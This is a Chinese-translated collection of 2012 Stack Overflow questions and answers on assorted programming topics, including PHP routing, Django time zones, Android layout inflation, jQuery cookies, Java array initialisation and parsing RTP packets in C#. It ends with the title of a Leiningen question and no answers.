> 赞同：7
> 
> 时间：2012-04-09T20:26:12.163

我用相同的路由语法制作了自己的迷你框架。这就是我所做的：

1.  使用 MOD_REWRITE 将参数（如`/some/path/{info}`）存储在`$_GET`我调用的变量中`params`：

    `RewriteRule ^(.+)(\?.+)?$ index.php?params=$1 [L,QSA]`

2.  使用此函数解析参数并全局存储它们：

```
public static function parseAndGetParams() {

        // get the original query string

        $params = !empty($_GET['params']) ? $_GET['params'] : false;

        // if there are no params, set to false and return
        if(empty($params)) {
            return false;
        }

        // append '/' if none found
        if(strrpos($params, '/') === false) $params .= '/';

        $params = explode('/', $params);
        // take out the empty element at the end
        if(empty($params[count($params) - 1])) array_pop($params);

        return $params;
    } 
```

3.  动态路由到正确的页面：

    ```
    // get the base page string, must be done after params are parsed
    public static function getCurPage() {
        global $params;

        // default is home
        if(empty($params))
        return self::PAGE_HOME;
        // see if it is an ajax request
        else if($params[0] == self::PAGE_AJAX)
        return self::PAGE_AJAX;
        // see if it is a multi param page, and if not, return error
        else {
            // store this, as we are going to use it in the loop condition
            $numParams = count($params);

            // initialize to full params array
            $testParams = $params;
            // $i = number of params to include in the current page name being checked, {1, .., n}
            for($i = $numParams; $i > 0; $i--) {
                // get test page name
                $page = strtolower(implode('/', $testParams));

                // if the page exists, return it
                if(self::pageExists($page))
                    return $page;

                // pop the last param off
                array_pop($testParams);
            }

            // page DNE go to error page
            return self::PAGE_ERROR;
        }
    } 
    ```

这里的**值**是它从*最具体*的页面到最*不具体*的页面查找。此外，在框架之外进行锻炼可以让您*完全控制*，因此如果某处存在错误，您知道可以修复它 - 您不必在框架中查找一些奇怪的解决方法。

所以现在这`$params`是全局的，任何使用参数的页面都只是调用`$params[X]`它来使用它。没有框架的友好 URL。

然后我添加页面的方式是将它们放入一个在`pageExists($page)`调用中查看的数组中。

对于 AJAX 调用，我输入了一个特殊的**IF**：

```
// if ajax, include it and finish
if($page == PageHelper::PAGE_AJAX) {
    PageHelper::includeAjaxPage();
    $db->disconnect();
    exit;
} 
```

瞧——你自己的微路由框架。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-09T19:59:20.173

我推荐这篇文章[http://net.tutsplus.com/tutorials/other/a-deeper-look-at-mod_rewrite-for-apache/](http://net.tutsplus.com/tutorials/other/a-deeper-look-at-mod_rewrite-for-apache/)来理解使用 apache mod_rewrite 重写的 url，你不需要任何框架，只需要 php。这也是任何框架实现的深度

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-09T19:50:10.387

问题是路由是框架中的复杂事物。

也许你看看[Silex](http://silex.sensiolabs.org/documentation)。它是一个基于 Symfony2 组件的微框架。它没有 Symfony2 大，但有一些功能。

# python - Django 1.4 和时区

> ID：10078822
> 
> 赞同：4
> 
> 时间：2012-04-09T19:43:50.087
> 
> 标签：python, django, timezone

在 django 文档中，他们总是可以将日期时间对象存储在设置中提供的 TIME_ZONE 中。

我想问一下，仅对时间感知对象进行约会就足够了，还是我们必须将它们转换为 TIME_ZONE 设置？即，如果我的 TIME_ZONE = "America/Los_Angeles" 和 USE_TZ = True，并且我尝试保存“UTC”中的时区感知对象，那会起作用吗？也就是说，django 会在保存到数据库之前将该“UTC”时区对象转换为“America/Los_Angeles”吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-09T19:57:33.797

我相信使用`USE_TZ = True`django 会将所有内容以 UTC 格式保存到数据库中。每个 DateTime 对象都必须是时区感知才能保存。当 django 从数据库中检索日期时间时，它会自动将其从 UTC 更改为设置中指示的时区中的感知时间`TIME_ZONE`。

因此，要回答您的问题，如果您在 UTC 中有一个时区感知日期时间（比如说 19:00）并且您保存它，它将作为 19:00 保存到数据库中。当您检索它时，django 将使其在“America/Los_angelos”中识别 TZ，因此日期时间现在为 12:00。

您还可以通过调用从设置中的内容覆盖当前时区设置

```
from django.utils import timezone
timezone.activate('US/Central') 
```

# prolog - 用 Prolog 中的变量替换术语

> ID：10078824
> 
> 赞同：0
> 
> 时间：2012-04-09T19:44:02.770
> 
> 标签：prolog, dcg

我在 Prolog 中有一个 DCG，我可以像这样查询：

`q(Tree, [name, of, company], []).`

并得到一个响应，显示解析查询所采用的路径：

`Tree = q(['company (Class)', 'name (Attribute)'])`

现在我想提出一个查询，例如：

`q(Tree, [name, of, acme], []).`

并且无法匹配 term `acme`，我想创建一个变量`Acme`，以便得到类似的东西：

```
Acme = 公司
树 = q(['公司(类)', '名称(属性)'])

```

我正在使用 SWI-Prolog 并从另一种语言查询它，这就是为什么查询都是小写的。我的另一个选择是创建所有有效术语的词典并用变量替换查询中的所有未知数，但我希望有一个 Prolog 解决方案。

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T11:36:26.833

我是否正确理解您需要所有基于前缀的列表？以下内容是否适合您：

```
1 ?- p([name,of,company],L).
L = [name, of, company] ;
L = [name, of|_G456] ;
L = [name|_G453] ;
true.

2 ?- p([name,of,department,of,company],M).
M = [name, of, department, of, company] ;
M = [name, of, department, of|_G551] ;
M = [name, of, department|_G548] ;
M = [name, of|_G545] ;
M = [name|_G542] ;
true. 
```

如果这是预期的行为，那么实现它的代码可以是

```
p([],[]).
p([X|Xs],[X|Ys]) :- p(Xs,Ys).
p([_|_],_). 
```

# android - 使用通货膨胀从 XML 布局访问 TextView 字段？

> ID：10078826
> 
> 赞同：0
> 
> 时间：2012-04-09T19:44:21.777
> 
> 标签：android, android-layout

我对 Android 编程比较陌生，并且遇到了通货膨胀问题。我正在尝试创建一个简单的活动，该活动从先前选择的 ListView 项目中吐出一些描述性字段。

我可以毫无问题地从 ListView 访问源数据，但是显示所选数据的后续活动不起作用。具体来说，以下 XML 布局摘录（在 layout/info.xml 中）和相应的代码会生成一个运行良好的活动，但不会按需要显示字符串“XYZZY”（如上所示，该字符串通常是从动态获取的ListView，但在此示例中简化为硬编码字符串）。

我究竟做错了什么？这是 XML 摘录：

```
<?xml version="1.0" encoding="utf-8"?>

<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:background="@color/black"
    android:padding="10dp" >

    <!-- Info text -->
    <TextView
        android:id="@+id/infoname"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_margin="12dp"
        android:gravity="center_horizontal"
        android:textColor="@color/white"
        android:textSize="24sp" />

    ...

</RelativeLayout> 
```

这是java摘录：

```
@Override
public void onCreate(Bundle savedInstanceState) {

    super.onCreate(savedInstanceState);
    setContentView(R.layout.info);

    LayoutInflater li = getLayoutInflater();
    View infoView = li.inflate(R.layout.info, null);

    TextView name = (TextView) infoView.findViewById(R.id.infoname);
    name.setText("XYZZY");

    ...

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:47:26.900

通过设置 contentView() 您不需要自己进行充气。您看不到文本的原因是膨胀的布局未添加到视图层次结构中。

```
@Override
public void onCreate(Bundle savedInstanceState) {

    super.onCreate(savedInstanceState);
    setContentView(R.layout.info);

    TextView name = (TextView) findViewById(R.id.infoname);
    name.setText("XYZZY");

    ...

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T20:00:14.220

您不能在同一活动中为同一布局执行 setContentView(R.layout.info) 和膨胀，请选择其中一种方法。对于上面的示例，有正确的代码：

> ```
> @Override
> public void onCreate(Bundle savedInstanceState) {
> 
>     super.onCreate(savedInstanceState);
> 
>     LayoutInflater li = getLayoutInflater();
>     View infoView = li.inflate(R.layout.info, null);
> 
>     setContentView(infoView);
>     TextView name = (TextView) infoView.findViewById(R.id.infoname);
>     name.setText("XYZZY");
> 
>     ...
> 
> } 
> ```

# python - 等效于 os.getpardir()？

> ID：10078829
> 
> 赞同：0
> 
> 时间：2012-04-09T19:44:39.963
> 
> 标签：python

有没有比执行以下操作更简单的方法来获取父目录的字符串？

```
'/'.join(os.getcwd().split('/')[:-1]) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T19:53:01.500

我相信这对你来说会简单得多

```
os.path.abspath(os.path.pardir) 
```

甚至更简单

```
os.path.dirname(os.getcwd()) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T19:49:33.023

我不知道这样做的方法，但我会做类似的事情：

```
os.path.abspath(os.path.join(os.getcwd(), os.pardir)) 
```

编辑：这种方式有效，但[Ixanezis](https://stackoverflow.com/a/10078941/111644)方式可能更好。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-09T19:53:54.520

好吧，这个方法可能有用：

```
os.path.dirname(os.getcwd()) 
```

# c# - 在 Sitecore/ASP.NET 中隐藏标题的更好方法

> ID：10078832
> 
> 赞同：0
> 
> 时间：2012-04-09T19:45:19.920
> 
> 标签：c#, asp.net, sitecore

我正在使用 Sitecore，并且刚刚掌握了在 ASP.NET 中工作的窍门。我们没有第二个用于开发服务器的 Sitecore 许可证，所以我必须在网站上实时完成所有工作（确认！），因此由于需要重新编译/DLL 插入，我试图避免使用代码隐藏.

如果以下部分为空，我只是想隐藏部分标题。我想出了这个，它确实有效，但它看起来很笨重：

```
<% if (!string.IsNullOrEmpty(Sitecore.Context.Item.Fields["Grades"].ToString())) { %><h2 class="edu">Timeframe</h2><% } %>
    <sc:FieldRenderer runat="server" ID="mhTimeFrame" Fieldname="Timeframe" /> 
```

有没有更直接的方法来做到这一点？

顺便说一句：我知道 Sitecore 可以使用 XSLT 模板，但我们的网站是在没有使用 XSLT 的情况下构建的，所以我想坚持一种范式，以便未来的开发人员能够理解这一点。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T20:05:04.243

简单地说，您需要制定适当的开发流程，否则您将陷入困境！如果您还没有，请与 Sitecore 联系并确定您需要什么许可证才能启动并运行适当的开发环境。如果您是经过认证的开发人员，您可能有权获得开发实例。

现在，对于您的问题，您必须将逻辑放在某个地方。如果您无法修改代码隐藏、编译和部署，则需要将其放在 .ascx 中。你可以稍微修剪一下，我想...

```
<% if (Sitecore.Context.Item["Grades"] != "") { %><h2 class="edu">Timeframe</h2><% } %>
<sc:FieldRenderer runat="server" ID="mhTimeFrame" Fieldname="Timeframe" /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T20:25:35.290

为了摆脱标记中的`if`-statement，您可以设置`<h2 />`元素的 visible 属性：

```
<h2 class="edu" runat="server" Visible='<%# Sitecore.Context.Item.Fields["Grades"] != null %>'>
  Timeframe
</h2> 
```

要启动并运行它，您需要至少触发一次 DataBinding：

```
protected void Page_Load(object sender, EventArgs e)
{
  Page.DataBind();
} 
```

不过你需要一个开发环境；）

# c# - appharbor 后台工作人员的 App.config 转换

> ID：10078835
> 
> 赞同：1
> 
> 时间：2012-04-09T19:45:31.053
> 
> 标签：c#, app-config, appharbor

我想使用 app.config 转换，因为它是为[AppHarbor](https://appharbor.com/)后台工作人员上的 web.config 完成的。我尝试了上一个[问题](https://stackoverflow.com/a/5109530/125804)中提出的解决方案，但它似乎不起作用。这可能吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-28T02:52:24.363

您可以使用[SlowCheetah](http://visualstudiogallery.msdn.microsoft.com/69023d00-a4f9-4a34-a6cd-7e854ba318b5)（VS 扩展）以与 web.config 相同的方式转换 app.config。如果这对你不起作用，请告诉我。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T21:21:26.590

AppHarbor 实际上在部署后台工作程序之前已经应用了转换，但问题是文件名不再匹配。因此，如果我们正在转换 App.config，我们会寻找一个名为 App.Release.config 的转换。然而，在构建之后，文件名通常是 ExecutableName.exe.config 并且没有匹配的转换。

我们正在考虑解决这个问题的方法。同时，您可以重命名转换以匹配运行时配置文件名。

# android - 在opengl es中绘制背景的适当方法是什么？

> ID：10078840
> 
> 赞同：0
> 
> 时间：2012-04-09T19:45:54.140
> 
> 标签：android, opengl-es

我有一个 2400x480 像素的平铺背景。还有一层更远的视差效果。带有 for 循环的绘图背景是否合乎逻辑？

```
for(int i=0;i<100;i++) {
    //Drawing code like 0+2400*i ...
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-16T18:31:14.250

*我希望这能让你开始，但我真的不知道......*

我在下面假设纹理一次显示。由于纹理的大小`2400*480 = (3*800)*480`——我认为这可能不正确，但无论如何。

对于每一层，您有两个具有固定纹理坐标的四边形。最初，第一个四边形是可见的；在动画过程中，第一个移出屏幕，第二个移入。纹理边框必须匹配，否则会出现裂缝。

> ```
> +-------------++-------------+
> |             ||             |
> |             ||             |
> +-------------++-------------+
> ^             ^
>    visible
> 
> ... as time progresses ...
> +-------------++-------------+
> |             ||             |
> |             ||             |
> +-------------++-------------+
>       ^             ^
>          visible 
> ```

您可以对底层和下一层执行此操作。对不同距离的层使用不同的速度。当有多个图层时，您将需要混合。

如果第一个假设被证明是不正确的，则需要在动画期间修改纹理坐标。有一个全屏四边形，纹理坐标设置为纹理的三分之一。然后，沿同一方向线性平移所有四个坐标，直到碰到顶部。此时，您不知何故需要再次开始显示前三分之一——例如使用第二个四边形。

# java - 误导性的 Java XML 验证

> ID：10078842
> 
> 赞同：-2
> 
> 时间：2012-04-09T19:46:10.083
> 
> 标签：java, xml, validation, xsd, xml-validation

我正在针对 XSD 验证 XML。但我的 java 验证错误消息与 XMLSpy 的验证错误消息不同。这里 XMLSpy 是正确的，而 java 验证消息具有误导性。我正在使用以下代码来验证 XML：

```
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setValidating(true);
factory.setNamespaceAware(true);
SAXParser saxParser = factory.newSAXParser();
saxParser.setProperty(JAXP_SCHEMA_LANGUAGE, W3C_XML_SCHEMA);

saxParser.setProperty(JAXP_SCHEMA_SOURCE,new File("TXLife2.26.00.xsd"));
MySAXHandler dh = new MySAXHandler();
saxParser.parse(new File("test.xml"), dh); 
```

Java 验证消息说：

> cvc-complex-type.2.4.a：发现以元素“<element>”开头的无效内容。

但 XMLSpy 说：

> 元素 <parent_element> 下的此位置不允许元素 <element>

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:40:40.040

您收到的错误消息取决于您使用的验证器。两者都报告相同的错误。如果您想要一个带有更好错误消息的 Java XSD 验证器，请尝试一下 Saxon：您可能更喜欢它。但是错误报告是一门不精确的艺术：在设计错误消息时，实现者使用的信息有限，包括 (a) 用户的意图，以及 (b) 用户对技术的了解程度。

# azure - Azure 在访问 clientaccesspolicy.xml 和 crossdomain.xml 文件时尝试使用 127.0.0.1

> ID：10078843
> 
> 赞同：0
> 
> 时间：2012-04-09T19:46:11.643
> 
> 标签：azure, cross-domain, wcf-data-services, crossdomain.xml, clientaccesspolicy.xml

我在 Azure 上创建了一个典型的 Silverlight 5 应用程序，其中一个 Web 项目托管了托管 Silverlight XAP 文件的站点，另一个 Web 项目托管了 WCF 数据服务的集合。

这两个站点一起在一个 Azure 角色中运行，但在不同的端口上。端口 80 承载 WCF 数据服务，端口 8081 承载实际的 Silverlight 应用程序。

我在使用此配置时遇到了跨域问题。在通过 Fiddler 进行观察时，似乎当我的 Silverlight 应用程序调用服务时，正如预期的那样，它正在从 WCF 数据服务站点寻找 clientaccesspolicy.xml 和 crossdomain.xml 文件以允许跨域访问。但是，Silverlight 应用程序将请求发送到[http://127.0.0.1](http://127.0.0.1)，而不是 WCF 数据服务所在域的正确 URI。

谁能向我解释为什么应用程序试图转到 127.0.0.1 而不是正确的 URI？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T06:24:50.230

Silverlight 应用程序有一个名为“ServiceReferences.ClientConfig”的文件。当您添加服务引用时，该文件已创建。由于您从 127.0.0.1 添加了服务引用，因此您的文件配置为服务端点位于 127.0.0.1。

您需要做的是在部署之前手动更改 ServiceReferences.ClientConfig 文件，以修复服务端点地址（并将其设置为您正在使用的域）。

或者您可以使用[我的方法](http://blogs.staykov.net/2011/10/servicereferenceclientconfig-build.html)来处理此类问题。

# android - 是否可以以编程方式设置主屏幕？

> ID：10078851
> 
> 赞同：1
> 
> 时间：2012-04-09T19:47:23.130
> 
> 标签：android, homescreen

我已将我的应用程序设置为主屏幕（），所以当我点击主页按钮时，系统让我在默认主屏幕和我的应用程序之间进行选择。我选择我的应用程序，没关系。但是当用户更改设置时，我需要直接将主屏幕更改为默认（系统主屏幕）而不选择它。是否可以？

在此先感谢并为我的英语感到抱歉。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T21:24:39.620

您不能以编程方式设置主屏幕：您必须为用户提供选择他们想要使用的启动器的选项。

在为 Android 开发软键盘时，我遇到了类似的问题。由于您无法设置默认键盘，因此我显示了一个对话框，允许用户在设置过程中选择我的键盘。然后我验证了我的键盘现在是默认键盘，然后在设置向导中继续前进。

基本上，您能做的最好的事情就是显示对话框选择器以允许用户选择默认的系统主屏幕。

# javascript - IE 选择“箭头”

> ID：10078857
> 
> 赞同：4
> 
> 时间：2012-04-09T19:47:46.743
> 
> 标签：javascript, internet-explorer, internet-explorer-9

IE9 有一个可笑的蓝色箭头，只要浏览器窗口有选择，它就会呈现：

![在此处输入图像描述](../Images/82700dbc12cb8fdcac16aefa95f750bd.png)

无论是用户做出选择还是通过 JavaScript 以编程方式（如我的例子），都会发生这种情况。是否可以*不*显示此蓝色箭头？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T19:52:42.743

这是 IE9 的“加速器”。在 Tools -> Manage Add-Ons 对话框中禁用它们。MS 认为没有人会突出显示文本，除非他们想将它发送到他们的 FB 墙上。

# jquery - jQuery cookie 切换

> ID：10078861
> 
> 赞同：-1
> 
> 时间：2012-04-09T19:47:53.120
> 
> 标签：jquery, cookies, toggle, addclass

我试图在我的身体标签上切换一个类，同时使用 cookie 来记住用户设置。

使用 jquery cookie 插件，这就是我想出的

```
$("a#switchit").click(function () {
    if($.cookie('viewState')) {
        $('body').addClass('light') 
        $.cookie('viewState', 'true', { expires: 9999 });
    } else {
        $('body').removeClass('light')
        $.cookie('viewState', null); 
    };
}); 
```

我不是 jquery 方面的专家，所以语法和一切都可能是错误的，但希望你能看到我想要实现的目标并让我正确。

我的html：

```
<a id="switchit">Switch it</a> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T20:09:33.273

根据您对我对该问题的评论的回答，您的问题是您需要检查 cookie 的存在并在页面加载以及单击按钮时设置类。

对此进行扩展： cookie 将在页面刷新时保持不变（等待您将过期时间设置为合适的时间范围），而您对 DOM 进行的任何操作（即向正文添加类名）都不会保持不变。

您已经为您的用户正确设置了它以选择他们的配色方案，并且您正在设置您的 cookie 就好了。如果他们在之前的访问中设置了它，您只是省略了您提前检查的部分。

因此，在您的 jQuery 就绪函数中，添加：

```
$(document).ready(function(){
    if($.cookie('viewState') == 'true'){
        $('body').addClass('light');
    }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:58:23.530

逻辑问题，看第2行：

```
$("a#switchit").click(function () {
    if(!$.cookie('viewState')) {
        $('body').addClass('light') 
        $.cookie('viewState', 'true', { expires: 9999 });
    } else {
        $('body').removeClass('light')
        $.cookie('viewState', null); 
    };
}); 
```

看看，当 viewState 为 TRUE 时，你是否设置了 viewState=true。当 viewState 为 NULL 时，您需要设置 viewState=true。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T19:54:52.820

我认为这会奏效。

```
$("a#switchit").click(function () {
    var isNotSet = $.cookie('viewState') === null;
    $('body').toggleClass( 'light', isNotSet);
    if (isNotSet) {
      $.cookie('viewState', 'true', { expires: 9999 });
    } else {
      $.cookie('viewState', null); 
    }
}); 
```

# java - 如何将数组的所有元素初始化为java中的任何特定值

> ID：10078867
> 
> 赞同：126
> 
> 时间：2012-04-09T19:48:11.387
> 
> 标签：java, arrays

`C/C++`我们有`memset()`可以满足我愿望的功能，但是我如何`Java`将所有元素初始化为特定值？每当我们写`int[] array=new int[10];`时，这只是简单地初始化一个大小为 10 的数组，其中所有元素都为零。我只想为我的数组之一更改这个初始化整数。即我想初始化一个所有元素都等于的数组`-1`。否则我必须`for`在初始化之后放置一个循环，范围从索引`0`到索引`size-1`，在该循环内，我将元素分配给`-1`. 以下是更多理解的代码 -

```
 int[] array = new int[10];
    for (int i = 0; i < size; i++) {
        array[i] = -1;
    } 
```

我会正确吗？还有其他方法吗？

* * *

## 回答 #1

> 赞同：245
> 
> 时间：2012-04-09T19:50:27.873

如果它是原始类型，您可以使用`Arrays.fill()`：

```
Arrays.fill(array, -1); 
```

[*顺便说一句，`memset`在 C 或 C++ 中，只有`char`.* ]

* * *

## 回答 #2

> 赞同：33
> 
> 时间：2012-04-09T19:50:44.880

还有

```
int[] array = {-1, -1, -1, -1, -1, -1, -1, -1, -1, -1}; 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2017-02-01T21:38:03.037

Java 8 流也可以：

```
int[] a = IntStream.generate(() -> value).limit(count).toArray(); 
```

然而，这可能不是完成这项工作的最有效方式。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-04-09T19:52:27.693

如果它很短，你可以这样做：

`int[] array = {-1,-1,-1,-1,-1,-1,-1,-1,-1,-1};`

但这不仅对少数人不利。

更容易的是一个`for`循环：

```
 int[] myArray = new int[10];
  for (int i = 0; i < array.length; i++)
       myArray[i] = -1; 
```

编辑：我也喜欢`Arrays.fill()`其他人提到的选项。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-09T19:50:31.310

[java.util.Arrays.fill()](http://docs.oracle.com/javase/6/docs/api/java/util/Arrays.html#fill%28int%5B%5D,%20int%29)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-04-09T19:50:58.927

您是否尝试过[Arrays.fill 功能](http://docs.oracle.com/javase/6/docs/api/java/util/Arrays.html#fill%28boolean%5B%5D,%20int,%20int,%20boolean%29)？

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-04-09T19:51:35.240

您可以使用`Arrays.fill(array, -1)`.

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-04-09T20:07:05.340

显然，您可以使用 Arrays.fill()，但您完成它的方式也可以。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2020-01-02T18:30:53.783

对于您可以使用的列表

`Collections.fill(arrayList, "-")`

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2021-12-24T15:45:14.363

java.utils 中的 Arrays 类有一个方法。

```
Arrays.fill(your_array, value_to_fill); 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2019-03-01T11:06:16.787

使用 Java 8，您可以简单地使用`ncopies`类`Collections`：

```
Object[] arrays = Collections.nCopies(size, object).stream().toArray(); 
```

在您的情况下，它将是：

```
Integer[] arrays = Collections.nCopies(10, Integer.valueOf(1)).stream().toArray(Integer[]::new);
. 
```

[这](https://stackoverflow.com/a/24296741/1387113)是您的类似案例的详细答案。

# c# - 我有一个包含 RTP 数据包的日志文件：现在怎么办？

> ID：10078873
> 
> 赞同：2
> 
> 时间：2012-04-09T19:48:43.240
> 
> 标签：c#, ffmpeg, vlc, libvlc, sharpffmpeg

我有一个日志文件，其中包含来自黑盒设备的 RTP 数据包。我也有一个相应的 SDP 文件（RTSP DESCRIBE）。我需要将此文件转换为某种可播放的视频文件。我可以将这两个文件传递给 FFMpeg 或 VLC 或其他东西，然后让它将这些数据混合成可播放的东西吗？

作为替代计划，我可以循环遍历代码中的各个数据包并对每个数据包执行某些操作。但是，似乎有用于解析这些数据的现有库。它似乎手工完成将要求一个大型项目。是否有某种视频文件格式是 SDP 和 RTP 的原始混合？谢谢你的时间。

FFmpeg 或 VLC 有没有办法打开 SDP 文件，然后通过 STDIN 获取它们的输入数据包？

我通常使用 C#，但如有必要，我可以使用 C。

更新 1：这是我无法正常工作的代码。我正在尝试获得某种输出来与 ffplay 一起玩，但我还没有运气。它给了我无效的数据错误。据我所知，它确实正确地检查了所有数据。我的输出几乎和我的输入一样大（大约 4MB）。

```
 public class RtpPacket2
    {
        public byte VersionPXCC;
        public byte MPT;
        public ushort Sequence; // length?
        public uint Timestamp;
        public uint Ssrc;
        public int Version { get { return VersionPXCC >> 6; } }
        public bool Padding { get { return (VersionPXCC & 32) > 0; } }
        public bool Extension { get { return (VersionPXCC & 16) > 0; } }
        public int CsrcCount { get { return VersionPXCC & 0xf; } } // ItemCount
        public bool Marker { get { return (MPT & 0x80) > 0; } }
        public int PayloadType { get { return MPT & 0x7f; } } // PacketType
    }

    static void Main(string[] args)
    {
        if (args.Length != 2)
        {
            Console.WriteLine("Usage: <input RTP file> <output 3GP file>");
            return;
        }
        var inputFile = args[0];
        var outputFile = args[1];
        if(File.Exists(outputFile)) File.Delete(outputFile);

        // FROM the SDP : fmtp 96 profile-level-id=4D0014;packetization-mode=0
        var sps = Convert.FromBase64String("Z0LAHoiLUFge0IAAA4QAAK/IAQ=="); //      BitConverter.ToString(sps)  "67-42-C0-1E-88-8B-50-58-1E-D0-80-00-03-84-00-00-AF-C8-01"  string
        var pps = Convert.FromBase64String("aM44gA=="); //      BitConverter.ToString(pps)  "68-CE-38-80"   string
        var sep = new byte[] { 00, 00, 01 };

        var packet = new RtpPacket2();
        bool firstFrame = true;
        using (var input = File.OpenRead(inputFile))
        using (var reader = new BinaryReader(input))
        using (var output = File.OpenWrite(outputFile))
        {
            //output.Write(header, 0, header.Length);
            output.Write(sep, 0, sep.Length);
            output.Write(sps, 0, sps.Length);
            output.Write(sep, 0, sep.Length);
            output.Write(pps, 0, pps.Length);
            output.Write(sep, 0, sep.Length);
            while (input.Position < input.Length)
            {
                var size = reader.ReadInt16();
                packet.VersionPXCC = reader.ReadByte();
                packet.MPT = reader.ReadByte();
                packet.Sequence = reader.ReadUInt16();
                packet.Timestamp = reader.ReadUInt32();
                packet.Ssrc = reader.ReadUInt32();
                if (packet.PayloadType == 96)
                {
                    if (packet.CsrcCount > 0 || packet.Extension) throw new NotImplementedException();

                    var header0 = reader.ReadByte();
                    var header1 = reader.ReadByte();

                    var fragmentType = header0 & 0x1F; // should be 28 for video
                    if(fragmentType != 28) // 28 for video?
                    {
                        input.Position += size - 14;
                        continue;
                    }
                    var nalUnit = header0 & ~0x1F;
                    var nalType = header1 & 0x1F;
                    var start = (header1 & 0x80) > 0;
                    var end = (header1 & 0x40) > 0;

                    if(firstFrame)
                    {
                        output.Write(sep, 0, sep.Length);
                        output.WriteByte((byte)(nalUnit | fragmentType));
                        firstFrame = false;
                    }

                    for (int i = 0; i < size - 14; i++)
                        output.WriteByte(reader.ReadByte());
                    if (packet.Marker)
                        firstFrame = true;
                }
                else input.Position += size - 12;
            }
        }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T02:54:27.560

[http://www.bogotobogo.com/VideoStreaming/videostreaming_etc.php](http://www.bogotobogo.com/VideoStreaming/videostreaming_etc.php)

远离在数据包级别做任何事情，因为您可能会陷入编码流如何打包的细节中。

看看上面的链接。SDP / RTP / RTSP 流是相当复杂的协议，当您尝试将它们直接连接到期望只打开本地媒体文件的播放器时，它们通常不起作用。

如果您正在处理流并且想要从流中保存文件，您可能希望使用任何大型媒体项目（ffmpeg、vlc、live555、openrtsp）搜索“filesink”，因为这些项目已经具有开源 fileSink 实现（C , C++)。

例如，在 live555 中，所有编解码器在 ./live/liveMedia 目录中都有 fileSink 实现。

如果您有来自 SDP 源的流，则可以使用该轨道使用的编解码器的 fileSink 处理每个轨道（音频、视频）。然后，您可以将这些曲目混合到播放器或独立播放曲目。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T04:44:40.813

在 vlc 中打开 SDP 文件，然后编写一个小应用程序将您的 RTP 数据包重新播放到网络，以便 VLC 可以接收它们。确保将它们播放到 127.0.0.1 和与 SDP 文件匹配的端口号。

VLC 将等到它收到一些数据包，然后使用 VLC 保存媒体而不转码为 MP4 或类似文件格式。

# flash - 在 TinyMCE 中禁用小部件（iframe/flash）交互性

> ID：10078876
> 
> 赞同：0
> 
> 时间：2012-04-09T19:49:15.460
> 
> 标签：flash, iframe, widget, tinymce

我制作了一个插件来为 TinyMCE 插入小部件（iframe/flash），它可以工作。

现在我希望这些小部件在 TinyMCE 中显示时不是交互式的。

保存编辑器的内容后，我将其显示在普通 div 中。这里的小部件必须是交互式的。这个功能也已经完成了。唯一的问题是小部件在编辑器中是交互式的。

实现这一目标的最佳方法是什么？也许已经是标准解决方案（可能不是）？

例如，当我将它们插入编辑器时，将覆盖 div 添加到 iframe 中。并在获取内容或将其插入其他元素时使用一些正则表达式搜索或类似方法将其删除。但这可能不是很高效......有什么想法吗？

# python - Python 添加到字典 .csv 格式

> ID：10078879
> 
> 赞同：0
> 
> 时间：2012-04-09T19:49:36.103
> 
> 标签：python, csv, dictionary

我正在尝试向 Python 中的 CSV 文件添加一个新的键：值。键的新值来自表中现有键的值。

```
def addKey(allData):  
    allData = []  
    for i in range (0, len(allData)):  
        while i > 0 and allData[i] == allData[i+1]:  
            newKey = {}  
            newKeyVal = int(allData['key1']*100 + allData['key2'])  
            allData = dict(allData, newKey = newKeyVal)  
    return allData 
```

有什么建议么？我有一种感觉，这段代码一开始就是错的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T19:57:38.767

如果`allData`已经是一个字典，那么你会想要

```
allData["newkey"] = newKeyVal 
```

IIRC，dicts只会让你拥有每个键之一，所以只要字典中不存在“newkey”它就会添加它。

你可能不想要

```
allData = [] 
```

在那里。

# clojure - 如何加快 lein Uberjar 构建

> ID：10078881
> 
> 赞同：8
> 
> 时间：2012-04-09T19:49:44.990
> 
> 标签：clojure, leiningen

